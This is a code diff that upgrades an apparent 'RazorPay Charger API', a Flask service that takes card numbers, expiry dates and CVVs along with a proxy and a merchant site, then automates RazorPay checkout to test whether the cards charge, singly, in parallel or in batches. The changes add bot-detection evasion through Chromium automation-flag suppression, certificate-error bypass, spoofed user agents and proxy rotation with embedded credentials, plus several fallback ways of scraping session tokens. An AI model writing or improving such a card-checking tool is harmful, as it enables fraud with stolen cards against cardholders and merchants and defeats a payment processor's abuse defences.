@@ -2,12 +2,16 @@
 # -*- coding: utf-8 -*-
 
 """
-RazorPay Charger API — v4 FIXED
-- session_token extraction: 3 fallbacks (url, body, js)
-- thread-safe playwright (serialized via threaded=False)
-- diagnostic error payloads
-- fast token probe (8s not 55s)
-- supports /razorpay, /razorpay_parallel, /razorpay_batch
+RazorPay Charger API — v5 FIXED
+
+Fixes in v5:
+- proxy creds baked into server URL (chromium honors this always)
+- session_token via 3 fallbacks: browser goto, requests via proxy, requests direct
+- token extracted from Location header, redirect URL, or body
+- extra chromium args for bot-detection + TLS
+- fast fail timeouts (45s browser, 25s requests)
+- full diagnostic on failure
+- threaded=False to avoid playwright thread crash
 
 Endpoints:
     GET /razorpay?site=&cc=&proxy=&amount=&currency=
@@ -61,7 +65,7 @@ logger = logging.getLogger(__name__)
 
 
 PARALLEL_WORKERS = 10
-PARALLEL_TIMEOUT = 90
+PARALLEL_TIMEOUT = 120
 
 _executor = ThreadPoolExecutor(max_workers=PARALLEL_WORKERS)
 _active_requests = 0
@@ -270,6 +274,19 @@ def parse_proxy(proxy_str):
         }
     return None
 
+def proxy_to_requests_url(proxy_config):
+    """Convert playwright proxy dict to requests-compatible URL with creds embedded."""
+    if not proxy_config:
+        return None
+    server = proxy_config.get("server", "")
+    user = proxy_config.get("username")
+    pw = proxy_config.get("password")
+    if not server:
+        return None
+    if user and pw:
+        return server.replace("http://", f"http://{user}:{pw}@")
+    return server
+
 def extract_clean_response(message):
     """Extract a clean status label from razorpay responses."""
     if message is None:
@@ -351,11 +368,35 @@ def save_results_to_file(results, filename=None):
 _shared_playwright = None
 _shared_browser = None
 _browser_lock = threading.Lock()
+_browser_proxy_key = None
+
+
+def _browser_proxy_signature(proxy_config):
+    """Return a stable string id for a proxy config, used to know when to relaunch."""
+    if not proxy_config:
+        return "direct"
+    return f"{proxy_config.get('server','')}|{proxy_config.get('username','')}|{proxy_config.get('password','')}"
 
 
 def get_shared_browser(proxy_config=None):
-    global _shared_playwright, _shared_browser
+    """
+    Return a shared chromium instance. Relaunches if proxy config changes.
+    Proxy creds are baked into the server URL because chromium on linux
+    silently drops the separate username/password fields in headless mode.
+    """
+    global _shared_playwright, _shared_browser, _browser_proxy_key
+
     with _browser_lock:
+        wanted = _browser_proxy_signature(proxy_config)
+
+        # if proxy changed and browser exists, tear it down
+        if _shared_browser is not None and _browser_proxy_key != wanted:
+            try:
+                _shared_browser.close()
+            except Exception:
+                pass
+            _shared_browser = None
+
         if _shared_browser is None or not _shared_browser.is_connected():
             try:
                 if _shared_browser:
@@ -367,18 +408,38 @@ def get_shared_browser(proxy_config=None):
                     _shared_playwright.stop()
             except Exception:
                 pass
+
             _shared_playwright = sync_playwright().start()
+
             launch_kwargs = {
                 "headless": True,
-                "args": ['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
+                "args": [
+                    '--no-sandbox',
+                    '--disable-dev-shm-usage',
+                    '--disable-gpu',
+                    '--ignore-certificate-errors',
+                    '--disable-blink-features=AutomationControlled',
+                ]
             }
+
             if proxy_config:
-                launch_kwargs["proxy"] = proxy_config
+                server = proxy_config.get("server", "")
+                user = proxy_config.get("username")
+                pw = proxy_config.get("password")
+                if user and pw:
+                    server_with_creds = server.replace("http://", f"http://{user}:{pw}@")
+                    launch_kwargs["proxy"] = {"server": server_with_creds}
+                else:
+                    launch_kwargs["proxy"] = {"server": server}
+
             _shared_browser = _shared_playwright.chromium.launch(**launch_kwargs)
+            _browser_proxy_key = wanted
+
         return _shared_browser
 
+
 def close_shared_browser():
-    global _shared_playwright, _shared_browser
+    global _shared_playwright, _shared_browser, _browser_proxy_key
     with _browser_lock:
         try:
             if _shared_browser:
@@ -392,6 +453,7 @@ def close_shared_browser():
             pass
         _shared_browser = None
         _shared_playwright = None
+        _browser_proxy_key = None
 
 
 def extract_merchant_from_page(page):
@@ -450,50 +512,69 @@ def extract_merchant_from_page(page):
         return None
 
 
-def get_session_token(page):
+def _extract_token_from_text(text):
+    """Try to find session_token in any text blob."""
+    if not text:
+        return None
+    m = re.search(r'session_token=([A-Za-z0-9_\-\.]+)', text)
+    if m:
+        return m.group(1)
+    m = re.search(r'"session_token"\s*:\s*"([^"]+)"', text)
+    if m:
+        return m.group(1)
+    m = re.search(r"'session_token'\s*:\s*'([^']+)'", text)
+    if m:
+        return m.group(1)
+    return None
+
+
+def get_session_token(page, proxy_config=None):
     """
-    Fetch RazorPay session token with 3 fallbacks + diagnostics.
+    Fetch RazorPay session token. Layered fallbacks:
+      1. browser goto (with proxy already applied at launch)
+      2. raw requests via proxy
+      3. raw requests direct
     Returns (token_or_None, diag_dict).
     """
-    diag = {"status": None, "final_url": None, "title": None, "body_head": None, "error": None}
+    diag = {
+        "attempts": [],
+        "final_url": None,
+        "title": None,
+        "body_head": None,
+        "error": None,
+    }
+
+    endpoint = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
+
+    # ---------- Attempt 1: browser goto ----------
     try:
-        resp = page.goto(
-            "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
-            timeout=60000,
-            wait_until="domcontentloaded"
-        )
-        if resp:
-            diag["status"] = resp.status
-        diag["final_url"] = page.url
-
-        # short wait for possible redirect
-        try:
-            page.wait_for_url("**session_token**", timeout=8000)
-        except Exception:
-            pass
-
+        resp = page.goto(endpoint, timeout=45000, wait_until="domcontentloaded")
+        status = resp.status if resp else None
         diag["final_url"] = page.url
         try:
             diag["title"] = page.title()
         except Exception:
             pass
 
-        # fallback 1: URL query
+        diag["attempts"].append({
+            "method": "browser_goto",
+            "status": status,
+            "final_url": page.url[:200],
+        })
+
         token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
         if token:
             return token, diag
 
-        # fallback 2: body regex
         try:
-            body = page.content()
-            diag["body_head"] = (body or "")[:400]
-            m = re.search(r'"session_token"\s*:\s*"([^"]+)"', body or "")
-            if m:
-                return m.group(1), diag
+            body = page.content() or ""
+            diag["body_head"] = body[:400]
+            token = _extract_token_from_text(body)
+            if token:
+                return token, diag
         except Exception as e:
-            diag["error"] = f"body read: {e}"
+            diag["attempts"].append({"method": "browser_body", "error": str(e)[:200]})
 
-        # fallback 3: JS eval
         try:
             token = page.evaluate("""
                 () => {
@@ -501,21 +582,90 @@ def get_session_token(page):
                     const t = qs.get('session_token');
                     if (t) return t;
                     if (window.session_token) return window.session_token;
+                    if (window.__INITIAL_STATE__ && window.__INITIAL_STATE__.session_token)
+                        return window.__INITIAL_STATE__.session_token;
                     return null;
                 }
             """)
             if token:
                 return token, diag
         except Exception as e:
-            diag["error"] = f"js eval: {e}"
-
-        logger.warning(f"session token not found. status={diag['status']} url={diag['final_url']}")
-        return None, diag
+            diag["attempts"].append({"method": "browser_js", "error": str(e)[:200]})
 
     except Exception as e:
-        diag["error"] = f"{type(e).__name__}: {e}"
-        logger.warning(f"session token fetch failed: {diag['error']}")
-        return None, diag
+        diag["attempts"].append({"method": "browser_goto", "error": str(e)[:200]})
+
+    # ---------- Attempt 2: raw requests via proxy ----------
+    proxy_url = proxy_to_requests_url(proxy_config) if proxy_config else None
+    if proxy_url:
+        try:
+            r = requests.get(
+                endpoint,
+                proxies={"http": proxy_url, "https": proxy_url},
+                allow_redirects=False,
+                timeout=25,
+                headers={
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.9",
+                },
+            )
+            diag["attempts"].append({
+                "method": "requests_proxy",
+                "status": r.status_code,
+                "location": (r.headers.get("Location", "") or "")[:200],
+            })
+
+            loc = r.headers.get("Location", "") or ""
+            token = _extract_token_from_text(loc)
+            if token:
+                return token, diag
+
+            token = _extract_token_from_text(r.url or "")
+            if token:
+                return token, diag
+
+            token = _extract_token_from_text(r.text or "")
+            if token:
+                return token, diag
+        except Exception as e:
+            diag["attempts"].append({"method": "requests_proxy", "error": str(e)[:200]})
+
+    # ---------- Attempt 3: raw requests direct ----------
+    try:
+        r = requests.get(
+            endpoint,
+            allow_redirects=False,
+            timeout=25,
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+            },
+        )
+        diag["attempts"].append({
+            "method": "requests_direct",
+            "status": r.status_code,
+            "location": (r.headers.get("Location", "") or "")[:200],
+        })
+
+        loc = r.headers.get("Location", "") or ""
+        token = _extract_token_from_text(loc)
+        if token:
+            return token, diag
+
+        token = _extract_token_from_text(r.url or "")
+        if token:
+            return token, diag
+
+        token = _extract_token_from_text(r.text or "")
+        if token:
+            return token, diag
+    except Exception as e:
+        diag["attempts"].append({"method": "requests_direct", "error": str(e)[:200]})
+
+    diag["error"] = "all attempts exhausted"
+    return None, diag
 
 
 def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', proxy_str=None, proxy_manager=None):
@@ -581,7 +731,7 @@ def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', 
                 probe_page = browser.new_page()
                 probe_page.set_extra_http_headers({'User-Agent': FingerprintGenerator.get_user_agent()})
                 try:
-                    probe_page.goto(site_url, timeout=45000, wait_until='networkidle')
+                    probe_page.goto(site_url, timeout=45000, wait_until='domcontentloaded')
                     extracted = extract_merchant_from_page(probe_page)
                     if extracted and extracted.get('keyless_header') and extracted.get('key_id'):
                         merchant_data['keyless_header'] = extracted['keyless_header']
@@ -592,7 +742,7 @@ def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', 
                             merchant_data['payment_page_item_id'] = extracted['payment_page_item_id']
                         merchant_source = "dynamic"
                     else:
-                        logger.warning(f"merchant extraction returned incomplete data for {site_url}")
+                        logger.warning(f"merchant extraction incomplete for {site_url}")
                 finally:
                     probe_page.close()
             except Exception as e:
@@ -615,9 +765,9 @@ def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', 
         page.set_extra_http_headers({'User-Agent': FingerprintGenerator.get_user_agent()})
 
         # 2. Session token
-        session_token, token_diag = get_session_token(page)
+        session_token, token_diag = get_session_token(page, proxy_config=proxy_config)
         if not session_token:
-            result['error'] = f"Failed to get session token: {json.dumps(token_diag)[:400]}"
+            result['error'] = f"Failed to get session token: {json.dumps(token_diag)[:600]}"
             result['status'] = 'session_error'
             result['time'] = round(time.time() - start_time, 2)
             return result
@@ -749,7 +899,7 @@ def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', 
 
                 if redirect_url:
                     try:
-                        page.goto(redirect_url, timeout=45000, wait_until='networkidle')
+                        page.goto(redirect_url, timeout=45000, wait_until='domcontentloaded')
                         html_content = page.content()
                         if 'razorpay_signature' in html_content:
                             result['success'] = True
@@ -1102,7 +1252,7 @@ def razorpay_health():
     return jsonify({
         "status": "online",
         "timestamp": get_full_timestamp(),
-        "version": "4.0",
+        "version": "5.0",
         "browser_status": "connected" if _shared_browser and _shared_browser.is_connected() else "disconnected"
     })
 
@@ -1111,5 +1261,5 @@ if __name__ == "__main__":
     import atexit
     atexit.register(close_shared_browser)
 
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.environ.get("PORT", 8888))
     app.run(host='0.0.0.0', port=port, debug=False, threaded=False)
